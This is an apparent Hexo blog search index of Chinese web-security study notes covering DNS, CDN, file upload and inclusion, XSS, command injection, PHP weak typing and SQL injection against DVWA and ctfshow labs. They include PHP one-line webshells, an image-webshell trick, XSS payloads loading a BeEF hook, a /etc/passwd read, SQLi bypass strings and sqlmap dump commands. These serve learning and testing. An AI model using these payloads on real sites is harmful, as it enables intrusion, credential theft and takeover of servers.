<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>网安篇（1）</title>
    <url>/2022/10/01/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%881%EF%BC%89/</url>
    <content><![CDATA[<h5 id="域名："><a href="#域名：" class="headerlink" title="域名："></a>域名：</h5><p>顶级域名，又称一级域名，常见的有”.com”、”.org”、”.net”、”.cn”等<br><a href="http://baidu.com/">http://baidu.com</a> 一级域名<br>二级域名<br>bbs.baidu .com 二级域名<br>tieba.baidu .com 二级域名<br>多级域名：<br><strong>.</strong>.__.com</p>
<span id="more"></span>
<p>顶级域名：<br>com 商业机构<br>edu 教育及研究机构<br>firm 公司企业<br>gov 政府机构<br>info 信息服务<br>net 网络服务机构<br>nom 个人<br>org 专业团体<br>rec 娱乐类机构<br>store 销售类公司企业<br>web 从事WWW活动的机构</p>
<h5 id="DNS是什么："><a href="#DNS是什么：" class="headerlink" title="DNS是什么："></a>DNS是什么：</h5><p>DNS是域名系统,Domain Name System的缩写,服务域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。<br>DNS就是把域名解析为IP地址，提供我们上网，我们能够上网最终是找到IP地址。<br>比如，<a href="http://xxxx.com是域名,那么他的ip地址假设是144.144.144.144,我们用浏览器访问该的网页,先到dns服务器找http//xxxx.com%E5%AF%B9%E5%BA%94%E7%9A%84IP%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E9%80%9A%E8%BF%87IP%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E3%80%82">http://xxxx.com是域名，那么他的IP地址假设是144.144.144.144，我们用浏览器访问该的网页，先到DNS服务器找http://xxxx.com对应的IP地址，然后通过IP地址进行访问。</a><br>域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。<br>DNS服务器地址:<br>域名解释服务器,打比方,当你在地址栏输入 <a href="http://www.dns.com/">www.dns.com</a> 时,电脑不是直接就连接到百度的服务器里的,而是先向这个DNS服务器查询<a href="http://www.dns.com的ip地址,然后再按照这个ip地址转到百度的服务器里.一般都是每个地区有一个特定的dns服务器的,由isp提供的/">www.dns.com的IP地址,然后再按照这个IP地址转到百度的服务器里.一般都是每个地区有一个特定的DNS服务器的,由ISP提供的</a>.<br>由于ISP的拨号服务器一般都有缺省的DNS，所以你可以不用设置DNS，如果你需要指定一台DNS，你一定要了解这台DNS的准确IP（比如福州的163用户的DNS为202.101.98.55）。DNS设置方法如下：在“控制面板”下打开“网络”里的“TCP/IP”的“属性”，在“DNS设置”栏目选择“启用DNS”，并将DNS的IP地址添加即可。<br>IP192.168.X.X一般都是带有路由的IP，网关默认最后1位肯定是1，子网掩码 255.255.255.0简单说C类的IP，子网都可以这样设置<br>我的理解：DNS服务器地址就是将人们可以理解的域名解析成计算机可以获取的二进制语言（也就是这个域名实际所代表的IP地址）</p>
<h5 id="什么是CDN："><a href="#什么是CDN：" class="headerlink" title="什么是CDN："></a>什么是CDN：</h5><p>cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了<br>CDN与DNS的关系：<br>dns与cdn的关系<br>刚才说到cdn实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的cdn节点呢。这就需要dns服务来进行定位了。当我们通过使用dns服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的cdn节点。<br>通过dns服务我们可以很快的定位到用户的位置，然后给用户分配最佳cdn节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的ldns的话，调度服务器会给我分配到深圳电信的cdn服务器，这样就产生了错误的调度。</p>
<h5 id="网站程序产生漏洞："><a href="#网站程序产生漏洞：" class="headerlink" title="网站程序产生漏洞："></a>网站程序产生漏洞：</h5><p>SQL注入，文件上传，xss，代码执行，变量覆盖，逻辑漏洞，反序列化。</p>
]]></content>
      <categories>
        <category>——网络安全</category>
      </categories>
      <tags>
        <tag>——web</tag>
      </tags>
  </entry>
  <entry>
    <title>网安篇（2）</title>
    <url>/2022/10/02/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%882%EF%BC%89/</url>
    <content><![CDATA[<h4 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h4><p>1.从kali上的burpsuite上想要抓取物理机上的数据包，必须设置kali的网络连接为NAT模式，并且设置网段与物理机在同一个网段，在burpsuite上设置的代理与本机代理一致。<br>2.REQUEST是在网页端输入变量访问，POST则是在使用像中国蚁剑之类的工具连接。<br>3.MIME类型：一种文件拓展名包含一种MIME类型。</p>
<span id="more"></span>
<h5 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h5><p>第一：文件上传漏洞采用上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。<br>以下三条一句话木马<br>1.<?php @eval($_POST['flag']);?>此类为POST类型一句话木马，需蚁剑连接。<br>2.<?php eval($_REQUEST['php']);?>此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?php=phpinfo(),这里等号后面的只能填php语言有效）<br>3.<?php system($_REQUEST['linux']);?>此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?linux=cat /etc/psaawd,这里等号后面的只能填linux命令有效）<br>目前DVWA上的文件上传漏洞分为三个级别，分别为“low、medium、high”<br>low级别<br>将一句话木马用php文件打包好之后，上传到可以上传图片的地方（这里的上传点有较大的漏洞，安全级别为low，并未限制上传的文件格式），如果上传成功，我们可用菜刀或蚁剑之类的工具连接url地址，就可以获取网站控制权限。<br>medium级别<br>此时，安全性高了一个等级，文件上传有了文件类型的限制（如 if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp;），这样我们只有修改文件类型即可成功上传。<br>用burpsuite抓包修改Content-Type请求头里的内容即可，将MIME类型改为image/jpeg，再forward就能成功上传文件</p>
<h5 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h5><p>LFI<br>本地文件包含 Local File Include (LFI)<br>所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。<br>所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。<br>RFI<br>远程文件包含 Remote File Include (RFI)<br>如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。<br>远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。</p>
<p>文件包含漏洞也可以和文件上传漏洞相配合使用。<br>通过jpg文件和php文件的结合，将一句话木马隐藏在图片内。<br> 将jpg文件和php文件放在一个目录内，在这个目录cmd模式下输入   copy /b xxx.jpg + xxxx.php xxxxx.jpg 就可生成xxxxx.jpg文件。<br><?php fputs(fopen('shell.php','w'),'<?php eval($_post[flag]);>');?>这段代码意思是生成shell.php这个新文件，并将<?php eval($_post[flag]);>');?>写入。<br>最后将jpg文件上传，用蚁剑连接shell.php这个文件拿到权限。<br>这就叫条件竞争绕过  竞争条件：服务端首先是允许用户上传任意类型的文件，上传过后再去检查文件，如果文件存在恶意的内容，那么就会执行删除操作，可以利用这个时间差来完成攻击。</p>
]]></content>
      <categories>
        <category>——网络安全</category>
      </categories>
      <tags>
        <tag>——web</tag>
      </tags>
  </entry>
  <entry>
    <title>网安篇（3）</title>
    <url>/2022/10/02/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%883%EF%BC%89/</url>
    <content><![CDATA[<h4 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h4><h5 id="xss主要分类："><a href="#xss主要分类：" class="headerlink" title="xss主要分类："></a>xss主要分类：</h5><p>反射型xss攻击（Reflected XSS） ：又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻<br>击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。<br>存储型XSS（Stored XSS) ：又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据 库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大, 因为每当用户打开页面，查看内容时脚本将自动执行。</p>
<span id="more"></span>
<h6 id="xss弹框"><a href="#xss弹框" class="headerlink" title="xss弹框"></a>xss弹框</h6><p>弹框警告<br>此脚本实现弹框提示，一般作为漏洞测试或者演示使用,类似SQL注入漏洞测试中的单引号’, 一旦此脚本能执行，也就意 味着后端服务器没有对特殊字符做过滤&lt;&gt;/‘ 这样就可以证明，这个页面位置存在了XSS漏洞。 </p>
<p>php+HTML<br> &lt;scri.pt&gt;ale.rt(‘xss’)</p>
<h6 id="弹框警告并重定向"><a href="#弹框警告并重定向" class="headerlink" title="弹框警告并重定向"></a>弹框警告并重定向</h6><script>al.ert("请移步到我们的新站");location.href="http://www.qfedu.com"</script> 
<script>ale.rt('xss');location.href="http://10.1.64.35/mutillidae/robots.txt"</script> 
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;al.ert(&quot;请移步到我们的新站&quot;);location.href=&quot;http://www.qfedu.com&quot;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;al.ert(&#x27;xss&#x27;);location.href=&quot;http://10.1.64.35/mutillidae/robots.txt&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信 息，则可能在另外的站点重新登录账户（克隆网站收集账户） </p>
<h6 id="访问恶意代码"><a href="#访问恶意代码" class="headerlink" title="访问恶意代码"></a>访问恶意代码</h6><p>&lt;scri.pt src=”<a href="http://www.qfedu.com/xss.js&quot;&gt;">http://www.qfedu.com/xss.js&quot;&gt;</a><br>&lt;scri.pt src=”<a href="http://beef_ip:3000/hook.js&quot;&gt;">http://BeEF_IP:3000/hook.js&quot;&gt;</a></p>
]]></content>
      <categories>
        <category>——网络安全</category>
      </categories>
      <tags>
        <tag>——web</tag>
      </tags>
  </entry>
  <entry>
    <title>网安篇（4）</title>
    <url>/2022/10/03/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%884%EF%BC%89/</url>
    <content><![CDATA[<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>模式分隔符后的”i”标记这是一个大小写不敏感的搜索<br>模式中的 \b 标记一个单词边界，所以只有独立的单词”web”会被匹配，而不会匹配</p>
<span id="more"></span>
<p>PHP提供4个专门的执行外部命令的函数：exec(), system(), passthru(), shell_exec()</p>
<p>除了拼接函数外，我们还可以使用命令连接符来组合这些系统函数增加命令执行成功率。常见的命令连接符有（“|，&amp;&amp;，||”这三个连接符都是Windows系统与Linux系统共有的，而“&amp;”是Windows系统特有，“；”是Linux系统特有的）：</p>
<h4 id="管道操作符"><a href="#管道操作符" class="headerlink" title="管道操作符"></a>管道操作符</h4><p>A|B:无论执行的A命令是否正确，B命令都执行</p>
<p>&amp;&amp;<br>逻辑与</p>
<p>A&amp;&amp;B：只有在A命令成功执行的前提下，B命令才可以执行</p>
<p>||<br>逻辑或</p>
<p>A||B：只有在A命令没有执行失败的前提下，B命令才可以执行</p>
<p>&amp;<br>A&amp;B:不管A是否执行成功，B命令都会执行</p>
<p>;<br>A&amp;B:不管A是否执行成功，B命令都会执行</p>
<p>命令执行漏洞</p>
<h5 id="ctfshow29"><a href="#ctfshow29" class="headerlink" title="ctfshow29"></a>ctfshow29</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);       <span class="comment">//不输出错误</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;     <span class="comment">//接受参数</span></span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;<span class="comment">//没有匹配到flag就输出eval（&amp;c）意味着过滤了flag字符串</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>知识点：</p>
<p>1.linux通配符绕过：<em>匹配任意字符串/文本，包括空字符串。如 ls list -&gt; ls l</em>. ?匹配任意一个字符（不在括号内时）</p>
<p>2.[abcd]正则 表示匹配[ ] 里的任何一个字符abcd</p>
<p>3.[a-z] 匹配a-z的任意字符</p>
<p>4.拼接字符串cat file.txt == ca’t’ f’i’le.txt</p>
<p>5.换行符绕过：cat file.txt = cat f\ile.txt</p>
<p>最终palyload: ?c=system(‘cat f*’);</p>
]]></content>
      <categories>
        <category>——网络安全</category>
      </categories>
      <tags>
        <tag>——web</tag>
      </tags>
  </entry>
  <entry>
    <title>网安篇（5）</title>
    <url>/2022/10/30/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%885%EF%BC%89/</url>
    <content><![CDATA[<h1 id="一、学习内容"><a href="#一、学习内容" class="headerlink" title="一、学习内容"></a>一、学习内容</h1><h2 id="1-1dirsearch下载及使用"><a href="#1-1dirsearch下载及使用" class="headerlink" title="1.1dirsearch下载及使用"></a>1.1dirsearch下载及使用</h2><pre><code> GitHub的下载地址为：https://github.com/maurosoria/dirsearch
</code></pre>
<span id="more"></span>

<h3 id="1-1-1命令"><a href="#1-1-1命令" class="headerlink" title="1.1.1命令"></a>1.1.1命令</h3><p>使用python.exe dirsearch.py -h可以查看到各种命令。</p>
<p>常用：dirsearch.py -u ip地址 -e </p>
<p>​        -u 指定url</p>
<p>-e 指定网站语言</p>
<p>-w 可以加上自己的字典（带上路径）</p>
<p>例如:</p>
<h2 id="1-2修改请求头为本地访问"><a href="#1-2修改请求头为本地访问" class="headerlink" title="1.2修改请求头为本地访问"></a>1.2修改请求头为本地访问</h2><p>X-Forward-For：127.0.0.1</p>
<p>Referer：127.0.0.1</p>
<h2 id="1-3xss漏洞"><a href="#1-3xss漏洞" class="headerlink" title="1.3xss漏洞"></a>1.3xss漏洞</h2><p>在登录界面随便输入一个账号密码，看一下返回的信息若得到错误的信息，发现url里面有get类型的错误参数，如果没有过滤的话我们将文字替换为可以得到xss漏洞，没有过滤，拿下xss。</p>
<h2 id="1-4端口号对应服务"><a href="#1-4端口号对应服务" class="headerlink" title="1.4端口号对应服务"></a>1.4端口号对应服务</h2><p>HTTP                                             80</p>
<p>​        HTTPS                                            443</p>
<p>​        Telnet                                             23</p>
<p>​        FTP                                             221</p>
<p>​        SSH（远程登录）SCP（文件传输），端口重定向     22</p>
<p>​        SMTP                                            25</p>
<p>​         POP3                                            110</p>
<p>​        WebLogic                                        7001</p>
<p>​        TOMCAT                                        8080</p>
<p>​        WIN2003远程登录                                3389</p>
<p>​        Oracle数据库                                    1521</p>
<p>​        MS SQL*SEVER数据库sever                        1433</p>
<p>​        MySQL数据库sever                                3306</p>
<h2 id="2-1掌握php弱类型比较"><a href="#2-1掌握php弱类型比较" class="headerlink" title="2.1掌握php弱类型比较"></a>2.1掌握php弱类型比较</h2><h3 id="2-1-1php中其中两种比较符号"><a href="#2-1-1php中其中两种比较符号" class="headerlink" title="2.1.1php中其中两种比较符号:"></a>2.1.1php中其中两种比较符号:</h3><p>==：先将字符串类型转化成相同，再比较<br>===：先判断两种字符串的类型是否相等，再比较字符串和数字比较使用==时,字符串会先转换为数字类型再比较<br>var_dump(‘a’ == 0);//true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0。<br>var_dump(‘123a’ == 123);//true，这里’123a’会被转换为123。</p>
<p>var_dump(‘a123’ == 123);//false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。<br>举例：<br>var_dump(‘123a1’ == 123);//true<br>var_dump(‘1233a’ == 123);//false<br>&lt;、&gt;、&lt;=、&gt;=都存在和==相同的弱类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line">$a=@$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=@$_GET[&#x27;b&#x27;];</span><br><span class="line">if($a==0 and $a)&#123;</span><br><span class="line">    echo $flag1;</span><br><span class="line">&#125;</span><br><span class="line">if(is_numeric($b))&#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">if($b&gt;1234)&#123;</span><br><span class="line">    echo $flag2;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>(1)这里包含了config.php<br>(2)url接收参数a和b的值<br>(3)如果$a等于0 and <img src="https://g.yuque.com/gr/latex?a%EF%BC%8C%E8%BE%93%E5%87%BA" class="lazyload placeholder" data-srcset="https://g.yuque.com/gr/latex?a%EF%BC%8C%E8%BE%93%E5%87%BA" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img">flag1<br>(4)如果<img src="https://g.yuque.com/gr/latex?b%E6%98%AF%E6%95%B0%E5%AD%97%E6%88%96%E8%80%85%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%82%A3%E4%B9%88%E9%80%80%E5%87%BA%E5%BD%93%E5%89%8D%E8%84%9A%E6%9C%AC%0A(5)%E5%A6%82%E6%9E%9C" class="lazyload placeholder" data-srcset="https://g.yuque.com/gr/latex?b%E6%98%AF%E6%95%B0%E5%AD%97%E6%88%96%E8%80%85%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%82%A3%E4%B9%88%E9%80%80%E5%87%BA%E5%BD%93%E5%89%8D%E8%84%9A%E6%9C%AC%0A(5)%E5%A6%82%E6%9E%9C" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img">b&gt;1234，输出$flag2</p>
<p>if(true and true){ //这里$a==0 and $a，==为弱类型比较，字符串开头都为0，所以0==0 and ‘b’，因为字符串b存在，所以and后面也为true，所以双true，最后if括号里为true，执行if下面的语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $flag1;</span><br><span class="line">&#125;</span><br><span class="line">if(is_numeric(2222a))&#123;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">if(2222a&gt;1234)&#123;</span><br><span class="line">echo $flag2;</span><br></pre></td></tr></table></figure>

<h2 id="3-1sql手工注入"><a href="#3-1sql手工注入" class="headerlink" title="3.1sql手工注入"></a>3.1sql手工注入</h2><h3 id="3-1-1万能密码"><a href="#3-1-1万能密码" class="headerlink" title="3.1.1万能密码"></a>3.1.1万能密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; --</span><br><span class="line">admin&#x27; #</span><br><span class="line">admin&#x27;/*</span><br><span class="line">&#x27; or 1=1--</span><br><span class="line">&#x27; or 1=1#</span><br><span class="line">&#x27; or 1=1/*</span><br><span class="line">&#x27;) or &#x27;1&#x27;=&#x27;1--</span><br><span class="line">&#x27;) or (&#x27;1&#x27;=&#x27;1--</span><br></pre></td></tr></table></figure>

<h3 id="3-1-2mysql常见名称"><a href="#3-1-2mysql常见名称" class="headerlink" title="3.1.2mysql常见名称"></a>3.1.2mysql常见名称</h3><p>schema_name　　储存了所有数据库的库名<br>tables　　        储存了数据库库名，以及该库中包含的表名<br>table_schema　   储存了数据库名<br>table_name　　   储存了表名</p>
<h3 id="3-1-3手工注入命令"><a href="#3-1-3手工注入命令" class="headerlink" title="3.1.3手工注入命令"></a>3.1.3手工注入命令</h3><p>爆表<br>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>爆列<br>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=’dvwa’#</p>
<h3 id="3-1-4有回显的手工SQL注入步骤"><a href="#3-1-4有回显的手工SQL注入步骤" class="headerlink" title="3.1.4有回显的手工SQL注入步骤"></a>3.1.4有回显的手工SQL注入步骤</h3><p>mysql的注释可以是#或者– ，注意–后面有空格，可以写成– ss这样比较不容易漏掉空格。此外如果在url中用#要进行url编码，写为%23。</p>
<p>1、找注入点</p>
<p>2、找闭合，常见的有单引号、双引号（字符型），无闭合（数值型）</p>
<p>确定</p>
<p>3、确定列数 order by</p>
<p>4、确定字段类型 union select</p>
<p>5、爆库  union select 1,database()</p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;</span><br><span class="line">union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761   （0x64767761是dvwa的ascii码）</span><br></pre></td></tr></table></figure>



<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;dvwa&#x27;</span><br><span class="line">union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x64767761</span><br></pre></td></tr></table></figure>

<p>爆内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select group_concat(user),group_concat(password) from users</span><br></pre></td></tr></table></figure>

<h2 id="3-2sqlmap注入"><a href="#3-2sqlmap注入" class="headerlink" title="3.2sqlmap注入"></a>3.2sqlmap注入</h2><p>1、如果是post型，可以先burpsuite抓包保存为txt</p>
<p>2、找注入点（可以省略）</p>
<p>python sqlmap.py -u “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4”     （GET型，如果需要认证身份要加cookie）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\medium.txt”           （POST型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\high.txt” –second-url “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;</a>          （POST型，输入和回显不在同一个页面)</p>
<p>3、爆库</p>
<p>python sqlmap.py -u “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” -dbs           （GET型，全部可访问的数据库）</p>
<p>python sqlmap.py -u “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –current-db         （GET型，当前数据库）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\medium.txt” –current-db              （POST型，当前数据库）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\high.txt” –second-url “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;</a> –current-db     （POST型，输入和回显不在同一个页面，当前数据库）</p>
<p>4、爆表</p>
<p>python sqlmap.py -u “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –tables -D dvwa    （GET型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\medium.txt” –tables -D dvwa       （POST型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\high.txt” –second-url “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;</a> –tables -D dvwa         （POST型，输入和回显不在同一个页面)</p>
<p>5、爆列</p>
<p>python sqlmap.py -u “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –columns -D dvwa -T users    （GET型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\medium.txt” –columns -D dvwa -T users     （POST型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\high.txt” –second-url “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;</a> –columns -D dvwa -T users     （POST型，输入和回显不在同一个页面)</p>
<p>6、爆内容</p>
<p>python sqlmap.py -u “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie “security=low; PHPSESSID=6r4n8jpd2m6mm5nesv83m924n4” –dump -D dvwa -T users -C “user,password”     （GET型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\medium.txt” –dump -D dvwa -T users -C “user,password”     （POST型）</p>
<p>python2 sqlmap.py -r “E:\渗透测试学习资料\dvwa\sqli\high.txt” –second-url “<a href="http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;">http://192.168.116.132/dvwa/vulnerabilities/sqli/&quot;</a> –dump -D dvwa -T users -C “user,password”     （POST型，输入和回显不在同一个页面)</p>
<h2 id="3-3SQL注入防御"><a href="#3-3SQL注入防御" class="headerlink" title="3.3SQL注入防御"></a>3.3SQL注入防御</h2><p>SQL注入形成的原因是数据和代码没分离，用户可控的数据可以作为SQL语句执行。</p>
<p>因此防御sql注入最有效的方法是使用预编译语句，就像IMPOSSIBLE关这样。</p>
<p>预编译之后输入的参数不会再进行SQL编译，SQL语句的语义不会发生变化。</p>
<p>除此之外，也可以采用安全的存储过程，但存储过程本身可能存在注入；检查输入的数据类型也是有用的，但不是万能的；使用安全函数，注意数据库的最小权限原则也是有利的。</p>
<h2 id="4-1php正则匹配"><a href="#4-1php正则匹配" class="headerlink" title="4.1php正则匹配"></a>4.1php正则匹配</h2><p>元字符：</p>
<p>\d    匹配任意一个0-9的数字</p>
<p>\D    匹配任意一个除十进制数以外的字符，等价于[^0-9]</p>
<p>\s    匹配任意一个空白的字符，比如换页符、换行符、回车符号、制表符、垂直制表符</p>
<p>\S    匹配出空白字符以外的所有字符</p>
<p>\w    匹配任意一个数字或字母或下划线</p>
<p>\W    匹配除数字、字母、下划线以外的任意字符</p>
<p>.     匹配除换行符以外的任意一个字符</p>
<p>*     匹配0次，或1次、或多次其前面字符</p>
<p>+     匹配1次或多次其前面的字符</p>
<p>？    匹配0次或1次前面的字符</p>
<p>{n}   表示其前面字符恰好出现n次</p>
<p>{n,}  表示其前面字符出现不少于n次</p>
<p>{n,m} 表示其前面的字符至少出现n次，最多出现m次</p>
